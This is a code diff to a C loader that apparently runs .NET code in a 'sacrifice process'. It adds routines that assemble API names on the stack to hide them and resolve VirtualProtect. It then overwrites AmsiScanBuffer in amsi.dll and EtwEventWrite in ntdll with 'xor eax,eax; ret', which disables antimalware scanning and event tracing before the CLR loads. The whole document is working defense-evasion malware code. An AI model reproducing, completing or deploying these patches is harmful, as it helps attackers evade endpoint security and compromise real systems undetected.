@@ -267,6 +267,79 @@ DWORD WINAPI clr_entry(void* param) {
 
     fn_ExitThread pExitThread = (fn_ExitThread)pGetProcAddress((HMODULE)k32_base, s_et);
 
+    /* "VirtualProtect" on stack - needed for AMSI/ETW patching */
+    char s_vp[15];
+    s_vp[0]  = 'V'; s_vp[1]  = 'i'; s_vp[2]  = 'r'; s_vp[3]  = 't';
+    s_vp[4]  = 'u'; s_vp[5]  = 'a'; s_vp[6]  = 'l'; s_vp[7]  = 'P';
+    s_vp[8]  = 'r'; s_vp[9]  = 'o'; s_vp[10] = 't'; s_vp[11] = 'e';
+    s_vp[12] = 'c'; s_vp[13] = 't'; s_vp[14] = '\0';
+    typedef BOOL (__stdcall *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, DWORD*);
+    fn_VirtualProtect pVirtualProtect =
+        (fn_VirtualProtect)pGetProcAddress((HMODULE)k32_base, s_vp);
+
+    /* ------------------------------------------------------------------- */
+    /* Step 3b: Patch AMSI and ETW in the sacrifice process                */
+    /*          Must happen BEFORE the CLR loads (Step 4), because          */
+    /*          CLR init triggers AmsiScanBuffer and ETW providers.         */
+    /* ------------------------------------------------------------------- */
+
+    /* Patch AMSI: load amsi.dll, find AmsiScanBuffer, overwrite with xor eax,eax; ret */
+    {
+        char s_amsi[9];
+        s_amsi[0] = 'a'; s_amsi[1] = 'm'; s_amsi[2] = 's'; s_amsi[3] = 'i';
+        s_amsi[4] = '.'; s_amsi[5] = 'd'; s_amsi[6] = 'l'; s_amsi[7] = 'l'; s_amsi[8] = '\0';
+        HMODULE hAmsi = pLoadLibraryA(s_amsi);
+        if (hAmsi) {
+            char s_asb[16];
+            s_asb[0]  = 'A'; s_asb[1]  = 'm'; s_asb[2]  = 's'; s_asb[3]  = 'i';
+            s_asb[4]  = 'S'; s_asb[5]  = 'c'; s_asb[6]  = 'a'; s_asb[7]  = 'n';
+            s_asb[8]  = 'B'; s_asb[9]  = 'u'; s_asb[10] = 'f'; s_asb[11] = 'f';
+            s_asb[12] = 'e'; s_asb[13] = 'r'; s_asb[14] = '\0';
+            void* pAmsiScanBuffer = (void*)pGetProcAddress(hAmsi, s_asb);
+            if (pAmsiScanBuffer && pVirtualProtect) {
+                DWORD oldp = 0;
+                pVirtualProtect(pAmsiScanBuffer, 3, 0x40 /*PAGE_EXECUTE_READWRITE*/, &oldp);
+                unsigned char* p = (unsigned char*)pAmsiScanBuffer;
+                p[0] = 0x31; p[1] = 0xC0; p[2] = 0xC3; /* xor eax,eax; ret */
+                pVirtualProtect(pAmsiScanBuffer, 3, oldp, &oldp);
+            }
+        }
+    }
+
+    /* Patch ETW: find EtwEventWrite in ntdll, overwrite with xor eax,eax; ret */
+    {
+        /* ntdll base: re-walk PEB InMemoryOrderModuleList. entry[0] = ntdll. */
+        void* peb2;
+#ifdef _WIN64
+        peb2 = (void*)__readgsqword(0x60);
+        void* ldr2 = *(void**)((char*)peb2 + 0x18);
+        void* head2 = (void*)((char*)ldr2 + 0x20);
+        void* ntdll_entry = *(void**)head2;
+        void* ntdll_base = *(void**)((char*)ntdll_entry + 0x20);
+#else
+        peb2 = (void*)__readfsdword(0x30);
+        void* ldr2 = *(void**)((char*)peb2 + 0x0C);
+        void* head2 = (void*)((char*)ldr2 + 0x14);
+        void* ntdll_entry = *(void**)head2;
+        void* ntdll_base = *(void**)((char*)ntdll_entry + 0x10);
+#endif
+        if (ntdll_base) {
+            char s_etw[14];
+            s_etw[0]  = 'E'; s_etw[1]  = 't'; s_etw[2]  = 'w'; s_etw[3]  = 'E';
+            s_etw[4]  = 'v'; s_etw[5]  = 'e'; s_etw[6]  = 'n'; s_etw[7]  = 't';
+            s_etw[8]  = 'W'; s_etw[9]  = 'r'; s_etw[10] = 'i'; s_etw[11] = 't';
+            s_etw[12] = 'e'; s_etw[13] = '\0';
+            void* pEtwWrite = (void*)find_export(ntdll_base, s_etw);
+            if (pEtwWrite && pVirtualProtect) {
+                DWORD oldp = 0;
+                pVirtualProtect(pEtwWrite, 3, 0x40, &oldp);
+                unsigned char* p = (unsigned char*)pEtwWrite;
+                p[0] = 0x31; p[1] = 0xC0; p[2] = 0xC3;
+                pVirtualProtect(pEtwWrite, 3, oldp, &oldp);
+            }
+        }
+    }
+
     /* ------------------------------------------------------------------- */
     /* Step 4: Load mscoree.dll -> CLRCreateInstance                        */
     /* ------------------------------------------------------------------- */
